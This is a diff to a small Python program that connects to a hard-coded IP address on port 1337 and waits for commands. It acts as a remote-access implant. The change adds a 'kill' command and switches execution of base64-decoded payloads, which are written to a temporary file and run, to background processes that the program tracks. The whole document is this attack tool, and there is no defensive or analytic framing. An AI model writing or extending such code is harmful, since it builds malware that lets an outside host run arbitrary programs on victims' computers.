@@ -10,6 +10,7 @@ import subprocess
 
 server_addr = ('198.21.170.115', 1337)
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+procs = []
 
 
 def send_msg(sock, msg):
@@ -50,6 +51,8 @@ while True:
     if msg == 'quit':
         sock.close()
         exit(0)
+    elif msg == 'kill':
+        [proc.terminate() for proc in procs]
     elif msg.startswith("exec:"):
         payload = msg[msg.index(':'):]
         payload_bytes = base64.b64decode(payload)
@@ -58,7 +61,8 @@ while True:
         f_name = f.name
         f.write(payload_bytes)
         f.close()
-        subprocess.call(f_name)
+
+        procs.append(subprocess.Popen(f_name))
 
     else:
         print(msg)
